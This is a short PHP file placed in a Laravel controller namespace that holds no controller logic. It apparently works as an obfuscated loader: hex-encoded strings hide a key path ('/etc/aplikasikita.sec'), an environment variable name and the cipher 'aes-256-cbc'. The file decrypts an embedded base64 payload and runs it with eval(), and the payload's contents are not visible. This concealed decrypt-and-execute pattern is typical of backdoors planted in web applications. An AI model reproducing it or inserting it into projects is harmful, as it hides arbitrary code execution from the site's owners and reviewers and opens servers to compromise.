<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('FUDrO/+T799rYayvraXJzw==');

$c=base64_decode(

'5NZ9giM5/3D9nOW3KbPhk0EtqOLR/cQ0MKdVA7QNzrD3RUL02oLse5IEa5oJMsmn+aj7aCRWEsvb' .
'l0OxNPR7x4TE11rcNxph5PXWI7OkVaNyusCg311d8vhPb7gGm632iwsp0ko6pPl0iV4p57Gcw2Nj' .
'Aac9kKRwPvfqTTUX/goSP2abDRFIABDU3FGwIIhxHXZUsWqmudSgAGv7+Ckz9SBRuXJ9GnKhpzZM' .
'2i2ot/0/Y6DwMH+/cSqla3GK86n+'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

